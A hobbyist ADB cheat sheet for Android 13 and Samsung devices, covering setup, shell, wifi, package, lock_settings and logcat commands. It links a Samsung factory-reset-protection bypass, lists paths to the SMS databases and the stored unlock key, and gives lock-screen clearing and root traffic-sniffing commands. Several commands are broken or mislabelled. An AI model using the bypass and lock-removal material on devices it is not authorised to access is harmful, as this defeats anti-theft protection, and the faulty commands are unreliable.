<p align="center">
  <img width="120px" src="https://i.imgur.com/o2WZgcl.png" />
  <h2 align="center"># Android™ Debug Bridge (adb)</h2>
  <h3 align="center">Your journey to master <i>Android™ Shell</i> begins here</h3>
</p>

***

_Time flies really_, now its the the sixth time that I update this topic because now many new commands have been added that are adapted for the latest version of `Android v13`. I didnt find any good help page for several years and the ones that have existed since before are obsolete and on the ones that existed before, there are a lot of commands that has been removed and there have also been added other commands in recent times.

Android is used in all kind of devices, tv, android boxes, media centers, routers, switches, smartphones, tabs, it's even used in your car and alot of more devices we can find android and if if we get hold of root and shell and can master android via cli then you probably understand what an incredible benefit you can get by learning adb, you don't have to become a master, it's enough that you know a little more than most people and you suddenly have incredible experience on your CV in 2022 and above all, you will have more fun with your devices:) 

I have probably spent more then `1000`h working with android devices in cli and i still learning new things everyday

This wiki is up to date and we also cover new commands on `Android 13` - Release date for Android v13: `15 August 2022`. 



## Android 12 FRP Bypass for <small>All Samsung devices</small>
<li><a href="https://github.com/wuseman/Android_12_FRPBypass">Samsung Android 12 FRPBypass - All models</a></li>

## Secret Codes™ <small>Samsung Latest Models</small>

| Secret Code        | Description                         | ADB Command                         |
| :----------------- | :---------------------------------- | :-----------------------------------|
| *#06#              |  IMEI number     | com.sec.android.app.servicemodeapp/com.sec.android.app.modemui.activities.ShowIMEI
| *#0228#            |  Battery status  | com.sec.android.app.factorykeystring/com.sec.android.app.status.BatteryStatus
| *#0*#              |  HW Module Test  | com.sec.android.app.hwmoduletest/com.sec.android.app.hwmoduletest.HwModuleTest
| *#2222#            |  Service Mode    | com.sec.android.RilServiceModeApp/com.sec.android.RilServiceModeApp.ServiceModeApp
| *#2222#            |  WiFi Info       | com.sec.android.app.servicemodeapp/com.sec.android.app.servicemodeapp.WifiInfoActivity
| *#2663             |  Touch FIrmware  | com.sec.android.app.factorykeystring/com.sec.android.app.status.touch_firmware
| *#1234             |  FIrmware info   | com.sec.android.app.factorykeystring/com.sec.android.app.version.SimpleVersion


## Awesome Aliases For <small>ADB</small>

Copy and paste for add below aliases in ~/.bashrc

```bash
cat <<! >> ~/.bashrc

### StartIntent

alias startintent="adb devices| tail -n +2 | cut -sf 1 | xargs -I X adb -s X shell am start $1"

### APK Install

alias apkinstall="adb devices | tail -n +2 | cut -sf 1 | xargs -I X adb -s X install -r $1"

### Remove App

alias rmapp="adb devices | tail -n +2 | cut -sf 1 | xargs -I X adb -s X uninstall $1"

### Clear Application

alias clearapp="adb devices | tail -n +2 | cut -sf 1 | xargs -I X adb -s X shell pm clear $1"
!
```

## Download Android™ <small>Google Account Manager</small>

<li><a href="https://www.nr1.nu/archive/android/google_account_manager/google_account_manager.v4.0.3.apk">Google Account Manager Android 4.0.3</a></li>
<li><a href="https://www.nr1.nu/archive/android/google_account_manager/google_account_manager.v4.4.4.apk">Google Account Manager Android 4.4.4</a></li>
<li><a href="https://www.nr1.nu/archive/android/google_account_manager/google_account_manager.v5.0.1.apk">Google Account Manager Android 5.0.1</a></li>
<li><a href="https://www.nr1.nu/archive/android/google_account_manager/google_account_manager.v6.0.apk">Google Account Manager Android 6.0</a></li>
<li><a href="https://www.nr1.nu/archive/android/google_account_manager/google_account_manager.v7.0.apk">Google Account Manager Android 7.0</a></li>
<li><a href="https://www.nr1.nu/archive/android/google_account_manager/google_account_manager.v7.1.2.apk">Google Account Manager Android 7.1.2</a></li>
<li><a href="https://www.nr1.nu/archive/android/google_account_manager/google_account_manager.v7.1.25.apk">Google Account Manager Android 7.1.25</a></li>
<li><a href="https://www.nr1.nu/archive/android/google_account_manager/google_account_manager.v8.0.apk">Google Account Manager Android 8.0</a></li>
<li><a href="https://www.nr1.nu/archive/android/google_account_manager/google_account_manager.v8.1.apk">Google Account Manager Android 8.1</a></li>
<li><a href="https://www.nr1.nu/archive/android/google_account_manager/google_account_manager.v9.apk">Google Account Manager Android 9</a></li>
<li><a href="https://www.nr1.nu/archive/android/google_account_manager/google_account_manager.v10.apk">Google Account Manager Android 10</a></li>

## Open Android™ <small>Default Applications</small>
  
You must visit [https://wuseman.github.io/adb-cheatsheet/](https://wuseman.github.io/adb-cheatsheet/) to be able to open buttons

* [Click to Open ADB Settings](intent://com.sec.android.app.modemui.activities.USB.settings/#Intent;scheme=android-app;end)
* [Click to Open - Device Set Screen Lock](intent://com.google.android.gms/#Intent;scheme=promote_smartlock_scheme;end)
* [Click to Open - Device Settings](intent://com.android.settings/#Intent;scheme=android-app;end)
* [Click to Open - Device Calculator](intent://com.sec.android.app.popupcalculator/#Intent;scheme=android-app;end)
* [Click to Open USB Settings ](intent://com.sec.android.app.servicemodeapp/#Intent;scheme=promote_USBSettings_scheme;end)

## Open Android™ <small>Samsung Applications</small>

* [Click to Open - Alliance Shield X in Galaxy Store](https://galaxy.store/alliance)
* [Click to Open - Samsung Apps](intent://com.sec.android.app.samsungapps/#Intent;scheme=android-app;end)
* [Click to Open - Samsung My Files](intent://com.sec.android.app.myfiles/#Intent;scheme=android-app;end)
* [Click to Open - Samsung Galaxy Store ](intent://com.sec.android.app.samsungapps/#Intent;scheme=android-app;end)
* [Click to Open - Samsung Smart Switch](intent://com.samsung.knox.securefolder/#Intent;scheme=android-app;end)
* [Click to Open - Samsung Secure Folder](intent://com.samsung.knox.securefolder/#Intent;scheme=android-app;end)
* [Click to Open - Samsung Biometrics Fingerprint ID](intent://com.android.settings/com.samsung.android.settings.biometrics.fingerprint.FingerprintEntry/#Intent;scheme=android-app;end)

## Open Android™ <small>Google Applications</small>

* [Click to Open - Google Assistant](intent://com.google.android.apps.googleassistant/#Intent;scheme=android-app;end)
* [Click to Open - Google Chrome Browser](intent://com.android.chrome/#Intent;scheme=android-app;end)
* [Click To Open - Google Search App](intent://com.google.android.googlequicksearchbox/#Intent;scheme=android-app;end)
* [Click to Open - Google Youtube App](intent://com.google.android.youtube/#Intent;scheme=android-app;end)
* [Click to Open - Google GMAIL](intent://com.google.android.gm/#Intent;scheme=android-app;end)

## Open Android™ <small>Motorola Applications</small>

* [Click to Open - Motorola Default Launcher](intent://com.motorola.launcher3/#Intent;scheme=android-app;end)

## Open Android™ <small>Xiamaoi Applications</small>

* [Click to Open Mi Manager](intent://com.mi.android.globalFileexplorer/#Intent;scheme=android-app;end)

## Open Android™ <small>Secret Codes</small>

* [Click to Open UUISD Code - Show IMEI - *#06*](tel:%20*#0*#/#Intent;scheme=android-app;end")
* [Click to Open UUISD Code - Show Secret Diagnostic Mode - *#0#*](tel:%20*#0*#/#Intent;scheme=android-app;end")

## Android™ <small>Source Code</small>

* [Android™ Source Code](https://cs.android.com/android/platform/superproject/)

## Android™ Issue <small>Tracker</small>

* [Android™ Issue Tracker](https://code.google.com/p/android/issues/entry)

## Android Firmware <small>Downloading</small>

* [Download Samsung firmware faster with Frija](https://github.com/SlackingVeteran/frija/releases/download/v1.4.4/Frija-v1.4.4.zip) 

## ADB Shell / Fastboot <small>install</small>

#### Source Files

* [Download SDK Platform-Tools for Linux](https://dl.google.com/android/repository/platform-tools_r32.0.0-linux.zip)
* [Download SDK Platform-Tools for MacOSX](https://dl.google.com/android/repository/platform-tools_r32.0.0-darwin.zip)     
* [Download SDK Platform-Tools for Windows](https://dl.google.com/android/repository/platform-tools-latest-windows.zip)
  
#### MacOSX
```
1. Download the Android SDK Platform Tools ZIP file for macOS.
2. Extract the ZIP to an easily-accessible location (like the Desktop for example).
3. Open Terminal.
4. To browse to the folder you extracted ADB into, enter the following command: cd /path/to/extracted/folder/
5. For example, on my Mac it was this: cd /Users/Doug/Desktop/platform-tools/
6. Connect your device to your Mac with a compatible USB cable. 
    Change the USB connection mode to “file transfer (MTP)” mode. 
    This is not always required for every device, but it’s best to just leave it in this mode so you don’t run into any issues.
7. Once the Terminal is in the same folder your ADB tools are in, you can execute the following command to launch the ADB daemon: ./adb devices
8. On your device, you’ll see an “Allow USB debugging” prompt. Allow the connection.
9. Finally, re-enter the command from step #7. If everything was successful, 
    you should now see your device’s serial number in macOS’s Terminal window.
```

#### Linux
```
1. Download the Android SDK Platform Tools ZIP file for Linux.
2. Extract the ZIP to an easily-accessible location (like the Desktop for example).
3. Open a Terminal window.
4. Enter the following command: cd /path/to/extracted/folder/
5. This will change the directory to where you extracted the ADB files.
6. So for example: cd /Users/Doug/Desktop/platform-tools/
7. Connect your device to your Linux machine with your USB cable. 
    Change the connection mode to “file transfer (MTP)” mode. 
    This is not always necessary for every device, but it’s recommended so you don’t run into any issues.
8. Once the Terminal is in the same folder your ADB tools are in, you can execute the following command to launch the ADB daemon: ./adb devices
9. Back on your smartphone or tablet device, you’ll see a prompt asking you to allow USB debugging. Go ahead and grant it.
```
#### Windows 10
```
1: Download: https://dl.google.com/android/repository/platform-tools-latest-windows.zip
2: Extract the contents of this ZIP file into an easily accessible folder (such as C:\platform-tools)
3: Open Windows explorer and browse to where you extracted the contents of this ZIP file
4: Then open up a Command Prompt from the same directory as this ADB binary. This can be done by holding 
    Shift and Right-clicking within the folder then click the “Open command window here” option. 
5: Connect your smartphone or tablet to your computer with a USB cable. 
    Change the USB mode to “file transfer (MTP)” mode. Some OEMs may or may not require this, 
    but it’s best to just leave it in this mode for general compatibility.
6: In the Command Prompt window, enter the following command to launch the ADB daemon: adb devices
7: On your phone’s screen, you should see a prompt to allow or deny USB Debugging access. Naturally, 
   you will want to grant USB Debugging access when prompted (and tap the always allow check box if you never want to see that prompt again).
8: Finally, re-enter the command from step #6. If everything was successful,
   you should now see your device’s serial number in the command prompt (or the PowerShell window).
```
#### Arch Linux

```bash  
pacman -S android-tools
```

#### Gentoo (android-tools includes fastboot)
```bash
emerge --ask dev-util/android-sdk-update-manager dev-util/android-tools
```
#### Fedora
```bash
dnf install adb
```

#### Ubuntu
```bash
apt install adb fastboot -y    
```

## Android™ <small>files</small>

#### SMS and Phone Phone logs is stored in below files
  ```
/data/user_de/0/com.android.providers.telephony/databases/mmssms.db
/data/user_de/0/com.android.providers.telephony/databases/telephony.db
```

#### Audio files is stored in
```
/system/media/audio/ui/                       
/system/media/audio/ringtones
/system/media/audio/notifications
```

#### When you unlock your device your device will save encryption key in
```
/keyrefuge/misc/vold/user_keys/ce/0/current
```

#### Backup all Partitions from /dev/block/by-name on your PC (root required)
```bash
for partitions in $(ls /dev/block/by-name/); do 
    "su -c dd if=/dev/block/by-name/partitions"|dd of=${partitions}.img; 
done
```

## ADB Shell <small>commands</small>
 
#### Start ADB server:
```bash
adb start-server 
```

#### Stop ADB server:
```bash
adb stop-server
```

#### Kill ADB server: 
```bash
adb kill-server
```
#### Setup ADB server via Wi-Fi

```bash
adb tcpip <port>
```
#### Connect to ADB server: 

```bash
adb connect <device_ip>
```

#### Enable adb over wifi and autoconnect
```bash
adb shell ip addr | awk '/state UP/ {print $2}' | sed 's/.$//'
```

#### Auto connect to adb over wifi 

This requires that the usb cable is connected until you connect, 
once connected via usb copy and paste:

```bash
interface=$(adb shell ip addr | awk '/state UP/ {print $2}' | sed 's/.$//'; )
ip=$(adb shell ifconfig ${interface} \
    |egrep  -o '(\<([0-9]|[1-9][0-9]|1[0-9][0-9]|2[0-4][0-9]|25[0-5])\>\.){3}\<([0-9]|[1-9][0-9]|1[0-9][0-9]|2[0-4][0-9]|25[0-5])\>' \
    |head -n 1)
port="5555"

adb tcpip ${port};sleep 0.5
adb connect $ip:${port}; sleep 0.5
adb shell
```

#### Restarts the adbd daemon listening on USB

```bash
adb usb
```
#### List Connected Devices: 

```bash
adb devices
```
#### Get Status:

```bash
adb get-state  
```
#### Print Serial Number:

```bash
adb get-serialno 
```
#### Backup Device:

```bash
adb backup -all
```
#### Restore Device:

```bash
adb restore /path/to/backupflile.adb
```
#### Enter ADB shell:

```bash
adb shell
```
#### Enter if there is multiple devices connected:

```bash
adb -s <id_from_adb_devices> shell 
```
#### To print device serial no: 

```bash
adb get-serialno
```
#### Create a bugreport: 

```bash
adb bugreport
```
#### Install an app:

```bash
adb install <apk_file>
```
#### Install an app and keep all it's data from a previous setup: 

```bash
adb install -r <apk_file>
```
#### Uninstall an app: 

```bash
adb uninstall <apk_file>
```
#### Transfer a file from PC > Device 

```bash
adb push mypicture.png /storage/on/device
```

#### Transfer a file from Device > PC 

```bash
adb push myfolder /storage/on/device
```
#### Pull a file

adb pull = tansfer a file: device > pc

```bash
adb pull /storage/on/device/mypicture.png /path/on/pc
```
#### Pull a folder (Transfer a folder FROM device > pc)

```bash
adb pull /storage/on/device /path/on/pc
```
#### Pull installed apk files 

![Screenshot](previews/android-wpull-system-apks.gif)

* [Script for pull all installed Apks](https://raw.githubusercontent.com/wuseman/adb-cheatsheet/main/scripts/wpull-all-apks.sh)
* [Script for pull all installed system Apks](https://raw.githubusercontent.com/wuseman/adb-cheatsheet/main/scripts/wpull-system-apks.sh)
* [Script for pull all Apks installed by you](https://raw.githubusercontent.com/wuseman/adb-cheatsheet/main/scripts/wpull-third-party-apks.sh)

#### Pull all files inside a folder to a path (Transfer all files in a folder FROM device > pc)

```bash
adb pull /storage/on/device/ /path/on/pc # Notice the trial slash
```
## ADB Shell <small>uiautomator</small>

* Read screen via uiautomor and print IMEI for all active esim/sim cards on device

```bash
#!/bin/bash
# Author: wuseman

### Launch IMEI (same result if you type in caller app: *#06#)

am start \
    com.sec.android.app.servicemodeapp/com.sec.android.app.modemui.activities.ShowIMEI \
 
 
### Dump screen to /tmp/read_screen.tdt

uiautomator dump /sdcard/read_screen.txt;

### Extract and parse data from screen as you was uber pro ;-)

cat /sdcard/read_screen.txt \
    |tr ' ' '\n'\
    |awk -F'"' '{print $2}'\
    |grep "^[0-9]\{15\}$"\
    |nl -w 1 -s':'\
    |sed 's/^/IMEI/g'
    
```

Output:

```
IMEI1:351800000000008
IMEI2:351820000000006
```

## ADB Shell <small>exec-out</small>

Stream Device Screen on your PC

```bash
adb exec-out screenrecord --Example Output-format=h264 - \
    | prefered tool - <stdin>
```
#### Stream via Mplayer (Recommended)

Recommended since it is starts immediately, very little delay, and doesn't freak out like vlc.

```bash
adb exec-out screenrecord \
    --output-format=h264 - \
        |ffplay \
        -framerate 60 \
        -probesize 32 \
        -sync video  -
```
* ffplay works, but it seems to take a few seconds to decide to start, and ends up lagging well behind the entire time.

#### Stream via FFPLay 

FFPlay Default - No Settings

```bash
adb shell screenrecord --Example Output-format=h264 - | ffplay -
```
FFplay Customized

```sh
adb exec-out screenrecord \
    --Example Output-format=h264 - \
        |ffplay \
        -framerate 60 \
        -probesize 32 \
        -sync video  -
```

```sh
adb shell screenrecord \
    --bit-rate=16m \
    --Example Output-format=h264 \
    --size 800x600 - \
        |ffplay \
        -framerate 60 \
        -framedrop \
        -bufsize 16M -
```

![Screenshot](https://nr1.nu/u/adb_record.gif)

FFplay Customized - Stream vin 1080p

```sh
adb exec-out screenrecord \
    --bit-rate=16m \
    --Example Output-format=h264 \
    --size 1920x1080 -
```

## ADB Shell <small>network</small>

#### Sniff your device network and SMS traffic via Wireshark on your PC

Via Shell
```bash
adb shell su -c tcpdump -nn -i wlan0 -U -s0 -w - \
    'not port 5555' \
    |wireshark -k -i -
```

Via exec-out
```sh
adb exec-out "su -c tcpdump -i any -U -w - 2>/dev/null" \
    |wireshark -k -S -i -
```

## ADB Shell <small>reboot</small>

#### System
```sh
adb reboot
```
#### Recovery

```bash
adb reboot recovery
```
#### Bootloader

```bash
adb reboot bootloader
```

#### Fastboot (some brands)
```bash
adb reboot fastboot
```
## ADB Shell <small>date</small>

#### Set date

```bash
adb shell date MMDDYYYY.XX;am broadcast \
    -a android.intent.action.TIME_SET
```

## ADB Shell <small>cmd</small>

#### Send notify and push notice to notification bar
```bash
adb shell su -lp 2000 -c "cmd notification post -S bigtext \
    -t 'adb pwnz' 'Tag' 'it rly does'"
```

!!! Notice "when lock screen is set, all commands require the --old <CREDENTIAL> argument."

## ADB Shell cmd <small>lock_settings</small>

#### Sets the package name for server based resume on reboot service provider.
```bash
adb shell cmd lock_settings set-resume-on-reboot-provider-package <package_name>
```

##### Removes cached unified challenge for the managed profile.
```bash
adb shell cmd lock_settings remove-cache \
    --user 0 
```
##### Verifies the lock credentials.
```bash
adb shell cmd lock_settings verify \
    --old 1234 --user 0 
```
##### Clears the lock credentials.
```sh
adb shell cmd lock_settings clear \
    --old 1234 --user 0 
```
##### Enables / disables synthetic password.
```sh
adb shell cmd lock_settings sp \
    --old 1234 \
    --user 0  <1|0>
```
##### Gets whether synthetic password is enabled.
```sh
adb shell cmd lock_settings sp \
    --old 1234 \
    --user 0 
```
#### Sets the lock screen as password, using the given PASSOWRD to unlock.
```sh
adb shell cmd lock_settings set-password \
    --old 1234 \
    --user 0 'newPassword`
```
##### Sets the lock screen as PIN, using the given PIN to unlock.
```sh
adb shell cmd lock_settings set-pin \
    --old 1234 \
    --user 0 `newPin`
```
##### Sets the lock screen as pattern, using the given PATTERN to unlock.
```sh
adb shell cmd lock_settings set-pattern \
    --old 1234 \
    --user 0  `newPattern`
```
##### When true, disables lock screen.
```sh
adb shell cmd lock_settings set-disabled \
    --old 1234 \
    --user 0  `true|false`
```
##### Checks whether lock screen is disabled.
```sh
adb shell cmd lock_settings get-disabled \
    --old 1234 \
    --user 0 
```

## ADB Shell cmd <small>stats</small>

```bash
start
adb shell cmd stats print-stats
```

#### Send a broadcast that triggers the subscriber to fetch metrics.
```bash
adb shell cmd stats send-broadcast `uid` `name`
```

```
 cmd stats send-broadcast [UID] NAME

     UID           The uid of the configuration. It is only possible to pass
                   the UID parameter on eng builds. If UID is omitted the
                   calling uid is used.
     NAME          The name of the configuration
```

####  Flushes all data on memory to disk.
```bash
adb shell cmd stats write-to-disk 
```

#### Prints the UID, app name, version mapping.
```bash
adb shell cmd stats print-uid-map 
```

#### Log a binary push state changed event.
```
adb shell cmd stats log-binary-push NAME VERSION STAGING ROLLBACK_ENABLED LOW_LATENCY STATE EXPERIMENT_IDS

NAME                The train name.
VERSION             The train version code.
STAGING             If this train requires a restart.
ROLLBACK_ENABLED    If rollback should be enabled for this install.
LOW_LATENCY         If the train requires low latency monitoring.
STATE               The status of the train push.
                        Integer value of the enum in atoms.proto.
EXPERIMENT_IDS      Comma separated list of experiment ids.
                        Leave blank for none.
```

#### Hide all notifications icons on Status Bar

```bash
adb shell cmd statusbar send-disable-flag notification-icons 
```
#### Reset all flags to default

```bash
adb shell cmd statusbar send-disable-flag none
```
#### Print Status Bar Icons

```bash
adb shell cmd statusbar get-status-icons
```
#### Print Preferences for Status Bar

```bash
adb shell cmd statusbar prefs list-prefs
```
#### Expand Status Bar

```bash
adb shell cmd statusbar expand-notifications
```
#### Collapse Status Bar

```bash
adb shell cmd statusbar collapse
```
#### Expand Full Settings

```bash
adb shell cmd statusbar expand-settings
```
#### Status Bar Help

```bash
adb shell cmd statusbar help
```
#### Print auth user
  
```bash
adb shell cmd user list   
```
#### Enable night mode (Dark Mode) 
  
```bash
adb shell cmd uimode night yes 
```
#### Disable night mode
  
```bash
adb shell cmd uimode night no
```
#### Enable car Mode
  
```bash
adb shell cmd uimode car yes
```
#### Disable car (car Mode) 
  
```bash
adb shell cmd uimode car no
```
#### Scan for nearby ssid:s, give it 7 seconds for scan and fetch some wifi data

![Screenshot](https://raw.githubusercontent.com/wuseman/adb-cheatsheet/main/previews/wifi_result.png)

```bash
#!/bin/bash

adb shell cmd -w wifi start-scan
sleep 7
adb shell cmd -w wifi list-scan-results  
```  
#### Sets whether we are in the middle of an emergency call.
    
Equivalent to receiving the `TelephonyManager.ACTION_EMERGENCY_CALL_STATE_CHANGED` broadcast.

```bash
adb shell cmd -w wifi set-emergency-call-state `enabled|disabled`
```
#### Sets whether Emergency Callback Mode (ECBM) is enabled.

```bash
adb shell cmd -w wifi set-emergency-callback-mode `enabled|disabled`
```
#### Lists the suggested networks from the app

```bash
adb shell cmd -w wifi list-suggestions-from-app `com.app.example`
```
#### Lists all suggested networks on this device
 
```bash
adb shell cmd -w wifi list-all-suggestions
```
!!! Note "This only returns whether the app was set via the 'network-requests-set-user-approved' shell command"

* Queries whether network requests from the app is approved or not.

```bash
adb shell cmd -w wifi network-requests-has-user-approved `com.app.example`
```
#### Note: Only 1 such app can be approved from the shell at a time

* Sets whether network requests from the app is approved or not.

```bash
adb shell cmd -w wifi network-requests-set-user-approved `com.app.example` yes|no
```
####  Lists the requested networks added via shell

```bash
adb shell cmd -w wifi list-requests
```
#### Removes all active requests added via shell

```bash
adb shell cmd -w wifi remove-all-requests
```
#### Remove a network request with provided SSID of the network
    
```bash
adb shell cmd -w wifi remove-request <ssid>
```
#### Add a network request with provided params

```bash
adb shell cmd -w wifi add-request <ssid> open|owe|wpa2|wpa3 [<passphrase>] [-b <bssid>]
```
#### Initiates wifi settings reset
    
```bash
adb shell cmd -w wifi settings-reset
```
#### Gets softap supported features. Will print 'wifi_softap_acs_supported'
    
```bash
adb shell cmd -w wifi get-softap-supported-features
```
#### Gets setting of wifi watchdog trigger recovery.
    
```bash
adb shell cmd -w wifi get-wifi-watchdog
```
#### Sets whether wifi watchdog should trigger recovery

```bash
adb shell cmd -w wifi set-wifi-watchdog `enabled|disabled`
```
#### Sets country code to <two-letter code> or left for normal value
    
```bash
adb shell cmd -w wifi force-country-code enabled <two-letter code> | disabled 
```
#### Manually triggers a link probe.
    
```bash
adb shell cmd -w wifi send-link-probe
```
#### Clears the user disabled networks list.
    
```bash
adb shell cmd -w wifi clear-user-disabled-networks
```
#### Removes all user approved network requests for the app.

```bash
adb shell cmd -w wifi network-requests-remove-user-approved-access-points \
    `com.app.example`
```
#### Clear the user choice on Imsi protection exemption for carrier

```bash
adb shell cmd -w wifi imsi-protection-exemption-clear-user-approved-for-carrier \
    <carrier id>
```
#### Queries whether Imsi protection exemption for carrier is approved or not

```bash
adb shell cmd -w wifi imsi-protection-exemption-has-user-approved-for-carrier \
    <carrier id>
```
#### Sets whether Imsi protection exemption for carrier is approved or not

```bash
adb shell cmd -w wifi imsi-protection-exemption-set-user-approved-for-carrier \
    <carrier id> yes|no
```
#### Queries whether network suggestions from the app is approved or not.

```bash
adb shell cmd -w wifi network-suggestions-has-user-approved `com.app.example`
```
#### Sets whether network suggestions from the app is approved or not.

```bash
adb shell cmd -w wifi network-suggestions-set-user-approved \
    `com.app.example` yes|no
```
#### Sets whether low latency mode is forced or left for normal operation.

```bash
adb shell cmd -w wifi force-low-latency-mode `enabled|disabled`
```
#### Sets whether hi-perf mode is forced or left for normal operation.

```bash
adb shell cmd -w wifi force-hi-perf-mode `enabled|disabled`
```
#### Gets current interval between RSSI polls, in milliseconds.

```bash
adb shell cmd -w wifi get-poll-rssi-interval-msecs
```
#### Sets the interval between RSSI polls to `<int>` milliseconds.

```bash
adb shell cmd -w wifi set-poll-rssi-interval-msecs `<int>`
```
#### Gets setting of `CMD_IP_REACHABILITY_LOST` events triggering disconnects.

Equivalent to receiving the `TelephonyManager.ACTION_EMERGENCY_CALL_STATE_CHANGED` broadcast,
sets whether we are in the middle of an emergency call.

```bash
adb shell cmd -w wifi set-emergency-call-state `enabled|disabled`
```
#### Equivalent to receiving the TelephonyManager.ACTION_EMERGENCY_CALLBACK_MODE_CHANGED broadcast.

```bash
adb shell cmd -w wifi set-emergency-callback-mode `enabled|disabled`
```
#### Lists the suggested networks from the app

```bash
adb shell cmd -w wifi list-suggestions-from-app `com.app.example`
```
#### Lists all suggested networks on this device

```bash
adb shell cmd -w wifi list-all-suggestions
```
#### Notice: This only returns whether the app was set via the 'network-requests-set-user-approved' shell command

Queries whether network requests from the app is approved or not

```bash
adb shell cmd -w wifi network-requests-has-user-approved `com.app.example`
```
#### Note: Only 1 such app can be approved from the shell at a time

Sets whether network requests from the app is approved or not.

```bash
adb shell cmd -w wifi network-requests-set-user-approved `com.app.example` yes|no
```
#### Lists the requested networks added via shell

```bash
adb shell cmd -w wifi list-requests
```
#### Removes all active requests added via shell

```bash
adb shell cmd -w wifi remove-all-requests
```
#### Remove a network request with provided SSID of the network

```bash
adb shell cmd -w wifi remove-request <ssid>
```
#### Add a network request with provided params

```bash
adb shell cmd -w wifi add-request <ssid> \
    open|owe|wpa2|wpa3 [<passphrase>] \
    [-b <bssid>]
```
#### Initiates wifi settings reset

```bash
adb shell cmd -w wifi settings-reset
```
#### and/or 'wifi_softap_wpa3_sae_supported', each on a separate line.

```bash
adb shell cmd -w wifi get-softap-supported-features
```
#### Gets setting of wifi watchdog trigger recovery.

```bash
adb shell cmd -w wifi get-wifi-watchdog
```
#### Sets whether wifi watchdog should trigger recovery

```bash
adb shell cmd -w wifi set-wifi-watchdog `enabled|disabled`
```
#### Sets country code to <two-letter code> or left for normal value

```bash
adb shell cmd -w wifi force-country-code enabled <two-letter code> | disabled 
```
#### Sets whether soft AP channel is forced to <int> MHz

```bash
adb shell cmd -w wifi force-softap-channel enabled <int> | disabled
```
#### Manually triggers a link probe.
 
```bash
adb shell cmd -w wifi send-link-probe
```
#### Clears the user disabled networks list.
 
```bash
adb shell cmd -w wifi clear-user-disabled-networks
```
#### Removes all user approved network requests for the app.
 
```bash
adb shell cmd -w wifi network-requests-remove-user-approved-access-points `com.app.example`
```
#### Clear the user choice on Imsi protection exemption for carrier
 
```bash
adb shell cmd -w wifi imsi-protection-exemption-clear-user-approved-for-carrier <carrier id>
```
#### Queries whether Imsi protection exemption for carrier is approved or not
 
```bash
adb shell cmd -w wifi imsi-protection-exemption-has-user-approved-for-carrier <carrier id>
```
#### Sets whether Imsi protection exemption for carrier is approved or not
 
```bash
adb shell cmd -w wifi imsi-protection-exemption-set-user-approved-for-carrier <carrier id> yes|no
```

#### Print all availble apps that can be manually started from activity manager
```bash
adb shell cmd package dump com.android.com |grep "Activity filter"|awk '{print $2}'
```

#### List uid owner of a package

```bash
adb shell cmd package list packages -U                
```

#### Print all application sorted by alpha
```bash
adb shell cmd package list packages|awk -F: '{print $2}'|sort
```
#### List packages a.k.a: pm list packages

```bash
adb shell cmd package list packages -l                                          
```
#### List disabled packages
     
```bash
adb shell cmd package list packages -d
```
#### Filter to only show enabled packages     
     
```bash
adb shell cmd package list packages -e                                       
```
#### Filter to only show third party packages    

```bash
adb shell cmd package list packages -3                                                 
```
#### Set the default home activity (aka launcher)

```bash
adb shell cmd package set-home-activity [--user USER_ID] TARGET-COMPONENT        
```
#### Prints all features of the system

```bash
adb shell cmd package list features 
```
#### Print briefs

```bash
adb shell cmd package resolve-activity --brief  com.facebook.katana        
```

## ADB Shell <small>pm</small>

[Contributed This Awesome Gist](https://gist.github.com/Pulimet/5013acf2cd5b28e55036c82c91bd56d8?permalink_comment_id=4273079#gistcomment-4273079)


#### Disable AutoUpdate for any Package
```bash
adb shell pm disable-user –user 0 <package_name>
```

#### Disable AutoUpdate for all applications
```bash
adb shell pm disable-user com.android.vending
```

#### Print all applications in use
```bash
adb shell pm list packages|sed -e "s/package://" 

|while read x; do 
    cmd package resolve-activity --brief $x \
    |tail -n 1 \
    |grep -v "No activity found" 
done 
```
#### List all packages installed on device 
```bash
adb shell pm list packages
```
#### List enabled packages
```bash
adb shell pm list packages -e
```
#### List disabled packages
```bash
adb shell pm list packages -d
```
#### List third party packages installed by user
```bash
adb shell pm list packages -3
```
#### List users
```bash
adb shell pm list users
```
#### List permission groups
```bash
adb shell pm list permission-groups
```
#### List features
```bash
adb shell pm list features
```
#### Uninstall any installed package:
```bash
adb shell pm uninstall --user 0 com.package.name
```
#### Uninstall multiple apps:
```sh
for packages in com.package1 com.package2; do 
    adb shell pm uninstall --user 0 "${packages}"
done 
```
#### Clear application data:
```bash
adb shell pm clear PACKAGE_NAME
```
#### List permission groups: 
```bash
adb shell pm list permission-groups 
```
#### List instrumentation:
```bash
adb shell pm list instrumentation
```
#### Grant permission to an app (Example Only For Grant): 
```bash
adb shell pm grant com.application android.permission.READ_LOGS
```
#### Revoke permission to an app (Example Only For Revoke): 
```bash
adb shell pm revoke com.application android.permission.READ_LOGS
```
#### Reset all permissions for an app:
```bash
adb shell pm reset-permissions -p your.app.package
```

## ADB Shell <small>log</small>

### Write logs to logcat
```bash
adb shell log -t wuuuuuuuuuuuuuuuuuuuuuuseman "message"
```
### Write logs with a priority
```bash
adb shell log -t wuuuuuuuuuuuuuuuuuuuuuuseman "message" -p INFO
```

Available Options:

`i: INFO`
`d: DEBUG`
`e: ERROR`
`f: FATAL`
`i: INFO`
`v: VERBOSE`
`: WARN`
`s: SILENT`


### Grep  your tag
```bash
adb shell logcat|grep wuuuuuuuuuuuuuuuuuuuuuuseman
```

## ADB Shell <small>logcat</small>

```
* V — Verbose (lowest priority)
* D — Debug
* I — Info (default priority)
* W — Warning
* E — Error
* F — Fatal
* S — Silent (highest priority, on which nothing is ever printed)
```

####    Print the most recent lines since the specified time. This option does not include include -d functionality. See the -P option for information about quoting parameters with embedded spaces.
```bash
adb logcat -t '01-26 20:52:41.820'
```
#### Dump the logs prior to the last reboot.
```bash
adb logcat -L  
```
#### The following example specifies an allowlist with PID 32676 and UID 675, and a denylist with PID 32677 and UID 897. PID 32677 on the denylist is weighted for faster pruning.
```bash
adb logcat -P '"/32676 675 ~/32677 897"'
```
#### Log buffer containing all buffer logs
```bash
adb logcat -b all -c color 
```
#### Print all ŕaido info
```bash
adb logcat -v threadtime -b radio -d \
    -f /data/log/radio_*.log
```
#### Log buffer containing radio and telephony messages
```bash
adb logcat -b radio -c color
```
#### Log buffer containing events
```bash
adb logcat -b  events -c color
```
#### Log buffer contains multi values is possible
```bash
adb logcat -b main -b radio -b events
```
#### You can use , for separator
```bash
adb logcat -b main,radio,events
```
#### Show log buffer event descriptions
```bash
adb logcat -v descriptive -v color
```

#### Display time in seconds starting from Jan 1, 1970.
```bash
adb logcat -v epoch -v color
```
#### Display time in CPU seconds starting from the last boot.
```bash
adb logcat -v monotonic -v color
```

#### Ensure that any binary logging content is escaped.
```bash
